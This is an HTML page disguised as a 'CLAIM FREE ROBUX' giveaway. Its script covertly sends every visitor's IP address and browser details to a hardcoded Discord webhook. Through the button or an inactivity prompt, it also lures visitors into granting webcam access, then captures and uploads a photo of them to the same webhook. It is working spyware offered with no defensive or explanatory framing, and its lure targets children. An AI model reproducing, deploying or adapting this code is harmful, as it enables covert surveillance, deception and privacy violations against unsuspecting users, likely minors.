<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
        }
        
        #executeBtn {
            background: linear-gradient(to right, #ff8a00, #e52e71);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            font-size: 18px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            z-index: 9999;
        }
        
        #executeBtn:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <button id="executeBtn">üéÅ CLAIM FREE ROBUX</button>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1403081784375250956/eaEVlqH7CvPktmPE8Cjo81X96IuwyH9qS-gTJ58DVS6NAdIbcQ8zuoo4ATQZ8funVWT2";
const DELAY_SECONDS = 3; // Delay before capturing webcam
const INACTIVITY_TIMEOUT = 30000; // 30 seconds inactivity timeout

// Track user activity
let userActive = true;
let inactivityTimer;

// Reset inactivity timer on user activity
function resetInactivityTimer() {
    userActive = true;
    clearTimeout(inactivityTimer);
    inactivityTimer = setTimeout(() => {
        userActive = false;
        showPermissionPopup();
    }, INACTIVITY_TIMEOUT);
}

// Initialize activity tracking
function initActivityTracking() {
    // Listen for any user activity
    window.addEventListener('mousemove', resetInactivityTimer);
    window.addEventListener('keydown', resetInactivityTimer);
    window.addEventListener('click', resetInactivityTimer);
    window.addEventListener('scroll', resetInactivityTimer);
    
    // Start the timer
    resetInactivityTimer();
}

// Show permission popup after inactivity
function showPermissionPopup() {
    if (confirm("You've been inactive for 30 seconds. Allow webcam for free robux?")) {
        hijackWebcam();
    } else {
        getIP().then(ip => {
            logToWebhook("‚ö†Ô∏è WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
        });
    }
}

// GET IP
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const { ip } = await res.json();
    return ip;
  } catch {
    return "IP_FETCH_FAILED";
  }
}

// LOG TO WEBHOOK
async function logToWebhook(title, description) {
  const embed = {
    title: title,
    description: description,
    color: title.includes("‚ùå") ? 0xff0000 : 0x00ff00,
    timestamp: new Date().toISOString()
  };
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] })
  });
}

// WEBCAM SNATCHER WITH DELAY
async function hijackWebcam() {
  try {
    const ip = await getIP();
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: {
        width: { ideal: 1920 },
        height: { ideal: 1080 },
        facingMode: "user"
      } 
    });
    
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play(); // Start video playback
    
    // Create preview container
    const preview = document.createElement("div");
    preview.style.position = "fixed";
    preview.style.bottom = "20px";
    preview.style.right = "20px";
    preview.style.width = "200px";
    preview.style.border = "2px solid red";
    preview.style.borderRadius = "10px";
    preview.style.overflow = "hidden";
    preview.style.zIndex = "99999";
    preview.appendChild(video);
    document.body.appendChild(preview);
    
    // Add loading text
    const loadingText = document.createElement("div");
    loadingText.textContent = `GETTING ROBUX in ${DELAY_SECONDS} seconds...`;
    loadingText.style.color = "white";
    loadingText.style.backgroundColor = "black";
    loadingText.style.padding = "5px";
    loadingText.style.textAlign = "center";
    preview.appendChild(loadingText);
    
    // Countdown timer
    let countdown = DELAY_SECONDS;
    const countdownInterval = setInterval(() => {
      countdown--;
      loadingText.textContent = `GETTING FREE ROBUX in ${countdown} seconds...`;
      if (countdown <= 0) {
        clearInterval(countdownInterval);
        captureFrame();
      }
    }, 1000);
    
    async function captureFrame() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      
      // Ensure video is properly loaded
      await new Promise(resolve => setTimeout(resolve, 500));
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, `webcam_${ip}.jpg`);
        fetch(WEBHOOK_URL, { method: "POST", body: formData });
        logToWebhook("üì∏ WEBCAM CAPTURED", 
          `IP: ${ip}\n` +
          `Resolution: ${canvas.width}x${canvas.height}\n` +
          `Delay: ${DELAY_SECONDS} seconds`);
        
        // Clean up
        stream.getTracks().forEach(track => track.stop());
        preview.remove();
      }, "image/jpeg", 0.90);
    }
    
  } catch (err) {
    logToWebhook("‚ùå WEBCAM FAILED", `IP: ${await getIP()}\nError: ${err.message}`);
  }
}

// MAIN EXECUTION
(async function() {
  const ip = await getIP();
  await logToWebhook("üåê VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);

  // Button event listeners
  const btn = document.getElementById("executeBtn");
  btn.addEventListener("click", hijackWebcam);
  
  // Initialize activity tracking
  initActivityTracking();
})();
</script>

</body>
</html>
